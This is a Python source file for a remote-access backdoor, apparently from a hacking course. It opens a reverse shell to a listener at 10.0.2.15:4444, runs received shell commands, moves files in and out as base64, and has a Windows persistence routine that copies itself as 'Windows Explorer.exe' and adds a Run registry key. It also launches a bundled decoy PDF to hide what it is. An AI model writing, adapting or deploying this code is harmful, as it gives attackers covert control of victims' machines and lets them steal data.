import socket
import subprocess
import json
import os
import base64
import sys
import shutil


class Backdoor:
    def __init__(self, ip, port) -> None:
        # self.become_persistene()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))


    def become_persistene():
        # For Windows persistence
        evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
        if not os.path.exists(evil_file_location):
            shutil.copyfile(sys.executable, evil_file_location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + evil_file_location + '"', shell=True)
        return


    def print_funct_info(self, funct_name, data):
        if print_function_info == True:
            if funct_name == "run":
                print("\n# # # # # # # # # # # # # # # # # # # # # #")
            print(f"\n{funct_name}")
            print(type(data))
            print(data)
        return


    def bytes_to_str(self, obj):
        if isinstance(obj, bytes):
            return obj.decode('utf-8')
        raise TypeError(f"Object of type {type(obj)} is not JSON serializable")


    def reliable_send(self, data):
        json_data = json.dumps(data, default=self.bytes_to_str)
        self.print_funct_info("reliable_send", json_data)
        self.connection.send(json_data.encode())


    def reliable_receive(self):
        json_data = b""
        while True:
            try:
                json_data += self.connection.recv(1024)
                self.print_funct_info("reliable_receive_raw", json_data)
                self.print_funct_info("reliable_receive_converted", json.loads(json_data))
                return json.loads(json_data)
            except ValueError:
                continue


    def execute_system_command(self, command):
        self.print_funct_info("execute_system_command", command)
        return subprocess.check_output(args=command, shell=True, stderr=subprocess.DEVNULL, strin=subprocess.DEVNULL)


    def change_working_directory(self, path):
        os.chdir(path)
        # print(f"[+] Changing working directory to '{path}'")
        return os.getcwd()


    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())


    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))


    def run(self):
        while True:
            command = self.reliable_receive()
            self.print_funct_info("run", command)

            # try:
            command_list = []
            split_list = command.split(" ")
            for i in split_list:
                i = i.strip("[',']")
                self.print_funct_info("split_list", i)
                command_list.append(i)
            self.print_funct_info("command_list", command_list)

            if command_list[0] == "exit":
                self.connection.close()
                print("[-] Session terminated remotely")
                sys.exit()
            elif command_list[0] == "cd" and len(command_list) > 1:
                self.print_funct_info("run / efif command_list[0] == 'cd'", command)
                print(f"Length: {len(command)}")
                command_result = self.change_working_directory(command_list[1])
            elif command_list[0] == "download":
                self.print_funct_info("run / download", command_list[0:1])
                command_result = self.read_file(command_list[1])
            elif command_list[0] == "upload":
                self.print_funct_info("run / upload", command_list[0:1])
                command_result = self.write_file(command_list[1], command_list[2])
            else:
                command_result = self.execute_system_command(command).decode()
            # except Exception:
            #     command_result = "[-] Error during remote command execution :-("
            self.print_funct_info("command_result", command_result)
            self.reliable_send(command_result)


file_name = sys._MEIPASS + "\sample.pdf"
subprocess.Popen(file_name, shell=True)

try:
    print_function_info = True
    my_backdoor = Backdoor("10.0.2.15", 4444)
    # my_backdoor = Backdoor("192.168.74.50", 4444)
    my_backdoor.run()
except KeyboardInterrupt:
    print("[-] Detected CTRL+C ... terminating app, please wait.")
except OSError as e:
    if "Connection refused" in str(e):
        print("[-] Connection request refused, no one is listening")
    else:
        print(f"[-] An unexpected OS Error occurred: {e}")
except subprocess.CalledProcessError:
    print("[-] Connection reset or invalid command ")
except Exception:
    sys.exit()

print("Goodbye!")
